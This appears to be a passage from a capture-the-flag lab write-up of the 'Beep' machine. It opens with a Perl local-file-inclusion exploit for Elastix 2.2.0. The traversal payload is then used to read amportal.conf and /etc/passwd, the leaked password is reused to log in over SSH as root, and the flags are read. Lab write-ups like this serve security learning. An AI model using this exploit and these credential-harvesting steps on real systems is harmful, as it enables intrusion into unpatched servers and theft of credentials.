print "\t Elastix 2.2.0 LFI Exploit \n";
print "\t code author cheki   \n";
print "\t 0day Elastix 2.2.0  \n";
print "\t email: anonymous17hacker{}gmail.com \n";

#LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action

use LWP::UserAgent;
print "\n Target: https://ip ";
chomp(my $target=<STDIN>);
$dir="vtigercrm";
$poc="current_language";
$etc="etc";
$jump="../../../../../../../..//";
$test="amportal.conf%00";

$code = LWP::UserAgent->new() or die "inicializacia brauzeris\n";
$code->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
$host = $target . "/".$dir."/graph.php?".$poc."=".$jump."".$etc."/".$test."&module=Accounts&action";
$res = $code->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~ 'This file is part of FreePBX') {
 
print "\n read amportal.conf file : $answer \n\n";
print " successful read\n";
 
}
else { 
print "\n[-] not successful\n";
}
```
Primarily, we are interested in `#LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action`.

From our earlier Gobuster search, we've already seen a directory `/vtigercrm`.

Going to our web browser, we go to `(https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action)`, but somehow got redirected to `(https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%2500&module=Accounts&action)`, with the error message: `Sorry! Attempt to access restricted file.` displayed.

![restricted2500](https://user-images.githubusercontent.com/21957042/114298271-1d52fc00-9ae8-11eb-81bf-999b7b095ca5.png)

We manually change the URL again from 2500 back to 00, and this time, get a valid HTML page. However, it's just a chunk of text and we instead we view the page source to see a formated version.

![access00](https://user-images.githubusercontent.com/21957042/114298272-1deb9280-9ae8-11eb-979f-81375abd788f.png)

```
# This file is part of FreePBX.
#
#    FreePBX is free software: you can redistribute it and/or modify
#    ...
#    along with FreePBX.  If not, see <http://www.gnu.org/licenses/>.
#
# This file contains settings for components of the Asterisk Management Portal
# Spaces are not allowed!
# Run /usr/src/AMP/apply_conf.sh after making changes to this file

# FreePBX Database configuration
# AMPDBHOST: Hostname where the FreePBX database resides
# AMPDBENGINE: Engine hosting the FreePBX database (e.g. mysql)
# AMPDBNAME: Name of the FreePBX database (e.g. asterisk)
# AMPDBUSER: Username used to connect to the FreePBX database
# AMPDBPASS: Password for AMPDBUSER (above)
# AMPENGINE: Telephony backend engine (e.g. asterisk)
# AMPMGRUSER: Username to access the Asterisk Manager Interface
# AMPMGRPASS: Password for AMPMGRUSER
#
AMPDBHOST=localhost
AMPDBENGINE=mysql
# AMPDBNAME=asterisk
AMPDBUSER=asteriskuser
# AMPDBPASS=amp109
AMPDBPASS=jEhdIekWmdjE
AMPENGINE=asterisk
AMPMGRUSER=admin
#AMPMGRPASS=amp111
AMPMGRPASS=jEhdIekWmdjE

# AMPBIN: Location of the FreePBX command line scripts
# AMPSBIN: Location of (root) command line scripts
#
AMPBIN=/var/lib/asterisk/bin
AMPSBIN=/usr/local/sbin

# AMPWEBROOT: Path to Apache's webroot (leave off trailing slash)
# AMPCGIBIN: Path to Apache's cgi-bin dir (leave off trailing slash)
# AMPWEBADDRESS: The IP address or host name used to access the AMP web admin
#
AMPWEBROOT=/var/www/html
AMPCGIBIN=/var/www/cgi-bin 
# AMPWEBADDRESS=x.x.x.x|hostname

# FOPWEBROOT: Path to the Flash Operator Panel webroot (leave off trailing slash)
# FOPPASSWORD: Password for performing transfers and hangups in the Flash Operator Panel
# FOPRUN: Set to true if you want FOP started by freepbx_engine (amportal_start), false otherwise
# FOPDISABLE: Set to true to disable FOP in interface and retrieve_conf.  Useful for sqlite3 
# or if you don't want FOP.
#
#FOPRUN=true
FOPWEBROOT=/var/www/html/panel
#FOPPASSWORD=passw0rd
FOPPASSWORD=jEhdIekWmdjE

# FOPSORT=extension|lastname
# DEFAULT VALUE: extension
# FOP should sort extensions by Last Name [lastname] or by Extension [extension]

# This is the default admin name used to allow an administrator to login to ARI bypassing all security.
# Change this to whatever you want, don't forget to change the ARI_ADMIN_PASSWORD as well
ARI_ADMIN_USERNAME=admin

# This is the default admin password to allow an administrator to login to ARI bypassing all security.
# Change this to a secure password.
ARI_ADMIN_PASSWORD=jEhdIekWmdjE

...

# AMPMODULEXML lets you change the module repository that you use. By default, it
# should be set to http://mirror.freepbx.org/ - Presently, there are no third
# party module repositories.
AMPMODULEXML=http://mirror.freepbx.org/

# AMPMODULESVN is the prefix that is appended to <location> tags in the XML file.
# This should be set to http://mirror.freepbx.org/modules/
AMPMODULESVN=http://mirror.freepbx.org/modules/

AMPDBNAME=asterisk

ASTETCDIR=/etc/asterisk
ASTMODDIR=/usr/lib/asterisk/modules
ASTVARLIBDIR=/var/lib/asterisk
ASTAGIDIR=/var/lib/asterisk/agi-bin
ASTSPOOLDIR=/var/spool/asterisk
ASTRUNDIR=/var/run/asterisk
ASTLOGDIR=/var/log/asterisk
Sorry! Attempt to access restricted file.
```
Wow, lots of information on credentials!

Let's filter through the information for something that we can actually use.
```
ARI_ADMIN_USERNAME=admin

# AMPDBPASS: Password for AMPDBUSER
# AMPDBPASS=amp109
AMPDBPASS=jEhdIekWmdjE

# AMPMGRPASS: Password for AMPMGRUSER
#AMPMGRPASS=amp111
AMPMGRPASS=jEhdIekWmdjE

# FOPPASSWORD: Password for performing transfers and hangups in the Flash Operator Panel
#FOPPASSWORD=passw0rd
FOPPASSWORD=jEhdIekWmdjE

# This is the default admin password to allow an administrator to login to ARI bypassing all security.
# Change this to a secure password.
ARI_ADMIN_PASSWORD=jEhdIekWmdjE
```
We see a username `admin`, and a common password, `jEhdIekWmdjE`. Since we saw Port 22 opened earlier, we can try to SSH into the system with this password found.

## 8. SSH (Port 22) with Credentials Found, Getting Flags
Upon getting password `jEhdIekWmdjE`, we can attempt to SSH into the system.
```
hippoeug@kali:~$ ssh admin@10.10.10.7
Unable to negotiate with 10.10.10.7 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1
```

Ah, let's fix this key exchange method by specifying `diffie-hellman-group1-sha1`.
```
hippoeug@kali:~$ ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 admin@10.10.10.7
admin@10.10.10.7's password: 
Permission denied, please try again.
```

We're getting some permission denied errors despite the correct password. Maybe it's the username that's wrong. Let's use the VTigerCRM exploit we used earlier to get the `etc/passwd` file to find the users.

Upon navigating to `(view-source:https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action)` on our web browser, we see some usernames indeed.

![etc passwd](https://user-images.githubusercontent.com/21957042/114298273-1e842900-9ae8-11eb-948e-ebfb19c7954e.png)

```
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
news:x:9:13:news:/etc/news:
uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
distcache:x:94:94:Distcache:/:/sbin/nologin
vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
pcap:x:77:77::/var/arpwatch:/sbin/nologin
ntp:x:38:38::/etc/ntp:/sbin/nologin
cyrus:x:76:12:Cyrus IMAP Server:/var/lib/imap:/bin/bash
dbus:x:81:81:System message bus:/:/sbin/nologin
apache:x:48:48:Apache:/var/www:/sbin/nologin
mailman:x:41:41:GNU Mailing List Manager:/usr/lib/mailman:/sbin/nologin
rpc:x:32:32:Portmapper RPC user:/:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
asterisk:x:100:101:Asterisk VoIP PBX:/var/lib/asterisk:/bin/bash
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
spamfilter:x:500:500::/home/spamfilter:/bin/bash
haldaemon:x:68:68:HAL daemon:/:/sbin/nologin
xfs:x:43:43:X Font Server:/etc/X11/fs:/sbin/nologin
fanis:x:501:501::/home/fanis:/bin/bash
Sorry! Attempt to access restricted file.
```
We see two interesting users, `fanis` and `root`, and did not see the `admin` user which we tried to SSH with.

Let's SSH into root with the credentials we found.
```
hippoeug@kali:~$ ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 root@10.10.10.7
root@10.10.10.7's password: 
Last login: Tue Jul 16 11:45:47 2019

Welcome to Elastix 
----------------------------------------------------

To access your Elastix System, using a separate workstation (PC/MAC/Linux)
Open the Internet Browser using the following URL:
http://10.10.10.7

[root@beep ~]# ls
anaconda-ks.cfg  elastix-pr-2.2-1.i386.rpm  install.log  install.log.syslog  postnochroot  root.txt  webmin-1.570-1.noarch.rpm
[root@beep ~]# cat root.txt
89dfb87953f6ecfb95897002221d0311
...
[root@beep home]# cd fanis
...
[root@beep fanis]# cat user.txt
798c7c7c1711198d3120ec639be0a321
```

Interestingly, we were also able to log into https://10.10.10.7:10000/ with the same credentials, `root` and `jEhdIekWmdjE`.
